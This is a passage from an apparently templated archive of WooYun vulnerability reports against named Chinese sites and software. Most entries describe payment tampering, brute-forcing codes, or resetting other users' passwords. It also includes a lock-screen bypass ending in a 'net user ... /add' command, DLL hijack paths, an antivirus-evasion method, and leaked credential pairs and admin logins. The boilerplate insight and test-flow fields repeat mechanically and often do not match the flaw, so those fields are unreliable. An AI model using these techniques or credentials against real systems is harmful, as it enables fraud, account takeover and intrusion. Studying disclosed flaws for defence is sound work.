**详情**: 主站有验证码，可惜不严谨填写上，错误的验证码后提交，抓包看到cookie中有某标示（返回结果：验证码错误）去掉后再发包，返回结果就不一样了（返回结果：密码错误）so 爆破走一波登录验证,密码都是123456759000187590004575900062

**POC**: 如上

**绕过**: 直接利用

**修复**: 验证不严谨
---

---
### [wooyun-2012-011547] 国内某大型汽车票务网支付漏洞
**厂商**: 畅途网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 订单中还是显示了实际金额，不过实际只支付1元

**绕过**: 直接利用

**修复**: 服务器开启SSL，对某电商平台返回金额信息进行对比验证
---

---
### [wooyun-2014-076667] 某旅游平台某客户端接口缺陷可撞库
**厂商**: 某旅游平台旅行网 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0148706] 元祖某重要功能存在设计逻辑缺陷
**厂商**: 上海元祖梦果子有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司关注元祖食品，有个微商城下单抓包，就是辣么简单妥妥的洞= =

**POC**: 某互联网公司关注元祖食品，有个微商城下单抓包，就是辣么简单妥妥的洞= =

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0107316] 凤凰商城1元购物漏洞（支付漏洞购买任意商品）
**厂商**: fhyx.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 简单的说就是没有判断负数导致可以一元买物品首先是选择2个商品加入购物车然后抓包https://example.com/[已脱敏] 一个是数量修改数量把一元的修改成-19然后付款

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2015-0124080] 乐友商城支付漏洞可任意金额购买商品
**厂商**: 乐友(中国)超市连锁有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 在支付的时候修改金额，此处修改0.1 元

**绕过**: 直接利用

**修复**: 签名
---

---
### [wooyun-2015-0140813] 某搜索引擎拼音输入法Win8登陆界面绕过
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 测试程序下载某搜索引擎拼音输入法最新版，下载地址为https://example.com/[已脱敏] 操作步骤2.1 Win8下安装某搜索引擎拼音输入法，进入锁屏界面（Win键+L）；2.2 调出“屏幕讲述人”操作界面，切换到某搜索引擎拼音输入法；2.3 在某搜索引擎拼音输入法中点击“熊掌”按钮后，在弹出的的界面中选择“皮肤中心”；2.4 选择使用Chrome打开；2.5 Chrome中通过file:///C:/Windows/System32浏览系统目录，并下载cmd.exe；2.6 执行cmd.exe并添加测试账户；相似漏洞：WooYun: 利用某搜索引擎输入法绕过windows登录和提权服务器

**POC**: 通过Chrome调出cmd后，执行net user test 123 /add可以成功添加账户，具体过程参考“详细说明”一节。夜深人静的时候刷漏洞不容易，官人多给点Rank可好？

**绕过**: 过滤绕过

**修复**: 在登陆界面下限制相关操作，可以参考某搜索引擎五笔输入法的处理方法。
---

---
### [wooyun-2014-061558] 猎豹极速WIFI通过某互联网公司预约改手机时间支付漏洞
**厂商**: 金山网络 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先某互联网公司搜索猎豹WIF关键字然后预约猎豹极速WIFI填上地址那啥的，回到手机设置--修改手机时间为5月21日12点然后点进去开抢直接付款就OK

**POC**: 显示付款成功，猎豹你给不给我发货，我就不知道啦~

**绕过**: 直接利用

**修复**: 你们自己玩，我是来求Rank的
---

---
### [wooyun-2015-0117172] 太平洋保险某站支付逻辑漏洞(超低价买多款商品)
**厂商**: 太平洋保险 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随便选商品!https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-054199] 中国南方航空股份有限公司商城支付缺陷
**厂商**: 中国南方航空股份有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 页面之间传递的敏感参数未加密，可以抓取参数修改！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加密
---

---
### [wooyun-2012-06708] m1905电影网存在严重支付漏洞
**厂商**: 电影网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: m1905电影网在对支付进行处理时，未使用SSL安全连接，也没有对购买时间进行限制。导致当购买时间为负数时，不但不会从帐户中扣除相应的金额，反而还会对帐户进行充值。

**POC**: 这里以购买VIP服务为例，其他支付服务麻烦厂商自检。====================================================选定购买的时候后，点击提交，使用Fiddler拦截发送的数据我们可以看到，其中的number中包括了我们续费的时间，我们将其修改为负数,RUN然后发现，网站上面的应付金额为-30元，确定。余额支付成功。查询余额，发现多了30元，通过购买VIP-1个月得到。

**绕过**: 直接利用

**修复**: 使用SSL进行对支付页面的加密限制购买时间的大小，设定最小值和最大值
---

---
### [wooyun-2016-0170319] 某市审计局设计逻辑缺陷导致内部信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台地址在底部:http://**.**.**.**/cms/admin看了下后台，没有验证码，可以爆破密码：56785678进入后台

**POC**: 后台地址在底部:http://**.**.**.**/cms/admin看了下后台，没有验证码，可以爆破密码：56785678进入后台

**绕过**: 直接利用

**修复**: 修改密码，，，修改后台，，加验证
---

---
### [wooyun-2015-0158756] onlylady女人志验证码设计缺陷&逻辑缺陷可撞库用户可封禁用户
**厂商**: onlylady女人志 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]	19850916	2889123457	123457	2890wenwen62	9831102	2897yangyi5200	5503178	2903geta	8859518	2907ddd	111111	2911chenchangh	123456	2928397981107	397981107	2949amimoon	630417	2966gfgf	123456	2970jj870528	111111	2984a123456	123456	2989diandi_001

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复验证码
---

---
### [wooyun-2014-088413] 360极速浏览器下载功能未限制同源可造成RFD攻击
**厂商**: 某安全厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参考https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: PPT里面还有关于如何修复，这里我就不说了，感兴趣的童鞋可以去看看，附上PPT下载地址：https://example.com/[已脱敏]
---

---
### [wooyun-2014-057128] LOL火力模式BUG已在网上疯传
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这东西我也就是看看，自己就用了一把看看效果。结果现在有人直接拿这个做了一个10M大小的UI来标榜所谓的crack tool鉴于如此那我就直接把源文件放出来一是为了引起足够重视，二是让大家别去下10M的坑爹货。源文件200K都不到，试想一个UI要10M，其中的细节大家自己开动脑筋思考吧各位你们如果在火力模式看到不该出现的英雄，不用怀疑，就是修改了客户端，截图举报吧。

**POC**: 使用方法，把该文件覆盖到 英雄联盟目录\Air\lib下载地址https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 更新游戏··建议先暂时关了火力模式
---

---
### [wooyun-2015-0151589] 花礼网支付逻辑漏洞，支付金额任意修改
**厂商**: 花礼网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 支付金额任意修改~

**POC**: 随便下个订单 ..支付抓包,get~这里没验证

**绕过**: 直接利用

**修复**: 验证~
---

---
### [wooyun-2013-017922] PHPMyWind后台一处登录自动全球同步登录!
**厂商**: PHPMyWind | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载4.6.0版本的PHPMyWind后，安装（包含测试数据），完成后在Chrome中登录后台，复制后台地址备用。（本地地址http://[IP已脱敏]

**POC**: 涉及到网站安全，短时间内提供测试地址https://example.com/[已脱敏] 若已被退出使用帐号密码admin，请勿修改相关信息。

**绕过**: 直接利用

**修复**: 暂无。
---

---
### [wooyun-2015-0161426] 无忧保姆APP验证码逻辑缺陷导致任意账号登录
**厂商**: 无忧保姆 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 等老板给安排活，无聊的时候想找个应用打发打发时间练练手，于是就看到了手机里为数不多的几个应用APP，无忧保姆就是一个。打开简单浏览了一下，发现可以通过手机号和验证码直接登录，于是想看看验证机制如何。首先要搞定手机号，时间有限，直接撞太麻烦，浏览的时候发现用户的手机只是抹去了中间四位：OK开撞，运气不错，300多次就撞出来了：拦截返回的包，发现了奇葩的设置：哎这么弱智也是醉了，直接登录成功：还能发工资，不过ms用自己的钱发，还是算了：趁还有时间，换了个人，也轻松登陆进去了：好了老板叫我干活去了，先到这吧，有时间再继续搞。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 既然要开手机号+验证码直接登陆这种模式，就把验证码搞强一点，直接明文发回来本地验证，太弱了。
---

---
### [wooyun-2012-016000] 窝窝团支付安全的业务逻辑漏洞
**厂商**: 窝窝团 | **年份**: 2012 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 认证接口

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 窝窝团的支付系统有严重逻辑漏洞，只要掌握用户账户和登录密码，系统就允许直接修改账户绑定的手机号码，通过修改后的手机号码可以修改支付密码，进而使用账户余额消费。也就是说，绑定手机和设置支付密码这些安全手段都形同虚设。此外，窝窝团注册时没有对登陆密码的复杂度做强制要求，用泄露的密码库随便扫一下，估计扫出几千个账户不成问题。

**POC**: 已绑定手机号并设置了支付密码输入另外一个手机号码和验证码就可以绑定新号码，没有进行任何验证绑定新号码后，就可以选择“忘记支付密码”，发送短信验证码到新手机号，来更改支付密码现在就可以使用账户余额消费了

**绕过**: 直接利用

**修复**: 1. 解绑手机前进行必要的验证2. 对登录密码复杂度做强制性要求3. 尽快自查被恶意入侵的账户
---

---
### [wooyun-2015-093988] 某快递公司优选支付逻辑漏洞
**厂商**: 某快递公司优选 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载某快递公司优选app应用，随便购买两件商品，商品为数量一正一负提交订单。提交订单时可能会报错。将两个参数的正负数调换可成功绕过。

**POC**: 由于app卸载了，只登录网站上的订单的截图：

**绕过**: 过滤绕过

**修复**: 校验商品数量
---

---
### [wooyun-2015-0157037] P2P之抓钱猫设计逻辑缺陷可任意手机号注册及重置用户密码 （以18688888888为例）
**厂商**: 抓钱猫 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: APP在各大应用商城都可下载 应用宝为佳https://example.com/[已脱敏] 官网https://example.com/[已脱敏] 下载app进入注册页面 以18688888888为例进行在线注册（ps:已拿自己手机验证过 验证码为4位数字）已1234来进行抓包抓包内容为使用burp 进行爆破 验证设置变量 内容从1000-9999跑完了查看返回值大小 可知道是否注册成功在手机端验证提示用户已注册 可见已注册成功 那就去登录吧登录成功

**POC**: 密码修改同任意账户注册burp暴力破解一下burp抓包 设置密码修改成功

**绕过**: 直接利用

**修复**: 你们比我更懂增加限制次数增加验证码位数等等
---

---
### [wooyun-2014-048515] FtpList(1.1.4)栈溢出漏洞
**厂商**: FtpList | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: lstrcat时候未对大小进行检测（具体见图）

**POC**: poc偏移为156H的地方就是SE处理程序的地址 该程序OEP为0040BDE0poc代码(我这里把SE处理程序地址修改成程序的OEP,也就是让程序再打开一次自己）www.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

**绕过**: 直接利用

**修复**: 检测大小
---

---
### [wooyun-2015-0162386] 某市邮件系统设计逻辑缺陷（附帐号证明）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 邮箱地址：http://**.**.**.**/coremail/index.jsp?cus=1通过理论得到邮箱格式 XXX@**.**.**.**设定密码123456fuzz下常见姓名top500得到几个可以登录您老多保重~

**POC**: POST /coremail/index.jsp?cus=1 HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer

**绕过**: 直接利用

**修复**: 改密码，可以跟我们公司合作哦~
---

---
### [wooyun-2015-092141] 某电商IM工具2014 DLL劫持漏洞
**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商IM工具最新版（版本8.00.40C），官方下载安装版本AliIM2014_taobao(8.00.40C).exe，windows xp sp4环境，某电商IM工具的主程序AliIM.exe在运行时会加载两个不存在的dll文件（该文件没有随某电商IM工具一起安装），导致恶意攻击者可以伪造该DLL文件用于劫持，严重时可危害用户的安全，如帐号窃取、网络钓鱼等。两个DLL文件的对应路径如下：C:\Program Files\AliWangWang\8.00.40C\modules\1685\WWPictureUpload.dllC:\Program Files\AliWangWang\8.00.40C\wwsdkcom.dll

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 严格DLL加载审查。
---

---
### [wooyun-2014-086283] 宜信某平台突破服务端验证（业务逻辑设计错误）
**厂商**: 宜信 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 宜信在线使用手机号注册好 点击进入我的账户此时会进行身份验证，只有投资过验证通过才能进入资产账户，也就是说宜信那边要通过某种方式确认你是投资了，服务端会进行确认或者其他类型操作确认你是投资过的才能通过，正常没有验证通过的用户输入身份证后是这样的下边来抓包看 http请求和响应 都拦截，观察，经过测试查看到其中端倪，看下图中途还进行了一次get请求，没做测试 仅限于做逻辑测试，所以直接看回应包此处服务器返回数据无参数 开发人员开发中利用此项服务器返回值作为验证用户是否投资，客户端返回数据可以修改，经过尝试将值改为1 看返回结果发送下响应到客户端执行，经过 4次回应，如下，已经绕过验证首先确定没有注册邮箱和手机号码，所以肯定收不到校验码，没关系，验证方式还是一样，随便填上校验码提交上抓包，拦截响应继续改，看截图这里需要验证身份此处将自己的邮箱和手机号填上

**POC**: 验证方式同一拨开发人员的开发的 问题应该都一样 其他平台位测试，感觉可以刷钱，由于没有正常账号所以未做测试。

**绕过**: 过滤绕过

**修复**: 认证方式需要修改
---

---
### [wooyun-2012-06667] 某互联网公司主显帐号逻辑漏洞
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 已经设置过了，直接查找某互联网公司号码是找不到的

**POC**: but,某互联网公司 for iphone的客户端...ps:漏洞为本人现实好友校长0day发现:)由于木有帐号，本人代为提交.刚刚提交的那个没提交好，再重新提交一次。Sorry

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-058905] 同时绕过某搜索引擎启发式引擎和主动防御
**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: XP停维护了，好多杀软嚷嚷着接微软的班，好吧，现在流行调戏杀毒软件，俺也来凑个热闹，其实以前给公司卖命的时候有N多调戏杀软的东西不能公布分享，现在俺就一个人，也想来乌云添砖加瓦！某搜索引擎杀毒有4大引擎，卡巴斯基杀毒引擎、云查杀引擎、极光引擎和智能修复引擎，其实新产生的病毒只需要过掉卡巴斯基杀毒引擎和极光引擎就够了。这其实曾经是以前公布过的一个思路，现在不少杀软改正了，但并不彻底。现在拿下载者为例，下载者的恶意特征就是“下载+执行”，大多数启发式杀毒只要看到山寨软件有这个行为就会报毒了，但如果我们把“下载+执行”分成两个文件会怎么样？DownFile.exe负责下载，ExecFile.exe负责把下载下来的东西跑起来，单独看两个文件都是没有恶意行为的，但它们配合到一起，嘿嘿。。。。。你懂的，两个文件配合的方式很多，利用bat、vbs、压缩包、系统回调等等想怎么玩都行。下面是实验过程细节：两个简单

**POC**: 注意某搜索引擎杀毒版本号为测试当天的最新版本，红色圆圈为生成好的下载者压缩包。运行压缩包下载者后，测试用的rar安装包被自动下载并且成功执行，整个过程某搜索引擎杀毒没有任何提示！程序源码，演示程序，视频等资源联系我都可以公开提供。

**绕过**: 直接利用

**修复**: 建立多个文件之间关联分析模型，切断配合路径。
---

---
### [wooyun-2013-047432] 广东农机申报系统存在逻辑缺陷波及多家企业安全
**厂商**: 广东农机申报系统 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.网站设计缺陷2.账户明文存储3.波及企业信息

**POC**: 漏洞地址：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 删除该页面，密码最好是做MD5加密
---

---
### [wooyun-2015-0138499] 某市政务平台设计逻辑缺陷（敏感信息泄漏）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下城区的政务平台-统一用户管理系统：http://**.**.**.**/logon/logonOut.action在忘记密码处存在修改任意账户密码漏洞。我们使用admin账户进行测试，身份验证方式选择工作手机,抓包，将手机号改为我们自己的。收到验证短信，修改密码，登陆系统。还可登陆运维系统，有大量敏感信息。协同任务系统。还有邮件系统。接下来，重点来了统一用户管理系统中有个通讯录，有下城区各部门机关的敏感信息，包括用户名、手机、职称等。具体信息就不截图了。各部门机关人员在统一用户管理系统的用户名为名字拼音，我们也就可以重置所有机关部门个人的密码，并登陆邮件等系统获取敏感信息。还有个小问题，在部门下城区区委和常委信息上是没有手机号码信息的，可以通过忘记密码处另一个设计缺陷，得到你所知道用户的手机号码。也就是说你知道了名字，也就知道了手机号和邮箱地址。

**POC**: 账号&密码：admin&wooyuntest

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2015-0156808] 海航旗下供销大集支付逻辑漏洞(可0元支付)
**厂商**: hnagroup.com | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 认证接口

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 供销大集网站：https://example.com/[已脱敏] 我们修改数量为-1然后在添加2张100的卡到购物车 结算为0提交付款即可

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强验证
---

---
### [wooyun-2015-0114437] 360极速浏览器设计不当可导致用户保存密码被窃取
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 思路来源：WooYun: 某浏览器等设计不当可导致用户密码被窃取危害1: 有些网站例如 sinaapp.com ，它的子域名都是由不同开发者开发的，如果有一个开发者恶意在页面中嵌入许多其他该域名下的隐藏登录表单，而用户又保存了该网站的密码，则该密码会自动填写进去。危害2：只要某域名有某个子站沦陷，攻击者无需利用COOKIE等就可以直接获得保存密码表单的用户的密码。 这里为了方便演示，我直接就借用作者的网站了，也懒得构造代码了。

**POC**: 访问1：https://example.com/[已脱敏] 输入用户密码访问2：https://example.com/[已脱敏] 就可以获取用户账户密码都可以最新版

**绕过**: 直接利用

**修复**: 参考chrome的安全机制。
---

---
### [wooyun-2015-0114435] 某安全浏览器设计不当可导致用户保存密码被窃取
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 思路来源：WooYun: 某浏览器等设计不当可导致用户密码被窃取危害1: 有些网站例如 sinaapp.com ，它的子域名都是由不同开发者开发的，如果有一个开发者恶意在页面中嵌入许多其他该域名下的隐藏登录表单，而用户又保存了该网站的密码，则该密码会自动填写进去。危害2：只要某域名有某个子站沦陷，攻击者无需利用COOKIE等就可以直接获得保存密码表单的用户的密码。 这里为了方便演示，我直接就借用作者的网站了，也懒得构造代码了。

**POC**: 访问1：https://example.com/[已脱敏] 输入用户账户密码访问2：https://example.com/[已脱敏]  可以获取用户密码

**绕过**: 直接利用

**修复**: 参考chrome的机制，严格匹配域名。不完全匹配，则需要用户输入 或者 单击输入框 才进行自动填充。
---

---
### [wooyun-2014-074587] 爱康国宾某APP导致敏感信息泄露
**厂商**: 爱康国宾 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 下载的apk反编译发现有1.某电商平台接口的RSA秘钥明文我找到一个类似案例WooYun: 如家酒店Android客户端程序支付漏洞进敏感信息泄漏2.可能用于破解弱密码的接口 (密码只让设置6位数字...)https://example.com/[已脱敏] 可以用于测试账号https://example.com/[已脱敏] 可以测试密码

**POC**: package com.ikang.alipay;public class PartnerConfig{public static final String ALIPAY_PLUGIN_NAME = "alipay_plugin_20120428msp.apk";public static final String PARTNER = "2088002383327079";public static final String RSA_ALIPAY_PUBLIC = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHYQ551qUCTRh/LLzkCoU4ww4Y

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2016-0165454] 上海师联网络设计逻辑缺陷影响3000+会员企业站点安全
**厂商**: 师联网络 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 喵呜..出门找客服妹子要小鱼干，google了下（此处应该mask）http://**.**.**.**/这界面 好粗糙的画风，算了，磨磨牙吧一时没有管好自己的爪子..看了眼Burp，然后...这诡异的系统一定是十年前的小咸鱼了，最近雾霾天，加个管理埋个洞，嗯嗯要不要拖他们的小裤裤捏，四下无人哟西，竟然有 苏州市工程监理协会 这种土豪协会，一定有好多小鱼干。。。随便进一个小窝，赶脚有点乱序，看来这小庙好久没人打理了，但域名，邮箱，网址瞅瞅都没有问题，看来师联应该是主机屋之类的空间商那，那翻翻师联网络的主站，http://**.**.**.**/用尾巴想了想，登录成功...后面怎么改首页，看邮箱，用管理，就不要深入了吧。。。心疼地舔了舔小爪子~~

**POC**: 喵呜。。。看看伦家的爪子，还需要证明么。。以爪印为证http://**.**.**.**/

**绕过**: 直接利用

**修复**: 你们更专业。。记得赔我的小鱼干~~咸鱼网站收起来吧
---

---
### [wooyun-2015-0110665] 搜狗浏览器DLL劫持漏洞
**厂商**: 搜狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜狗浏览器的主程序在运行中浏览某些特定网页(如某视频网站)后关闭页面时会加载一个不带路径的aticfx32.dll文件（该文件没有随搜狗浏览器一起安装），导致恶意攻击者可以伪造该DLL文件用于劫持，严重时可危害浏览器用户的安全，如帐号窃取、网络钓鱼等。windows环境其他没测试过咯搜狗浏览器（版本5.2.5.16447）不存在dll：aticfx32.dll运行程序：SogouExplorer.exe目录：F:\某门户网站浏览器\SogouExplorer

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 厂商懂
---

---
### [wooyun-2013-021076] 我是如何秒杀纽曼K1的
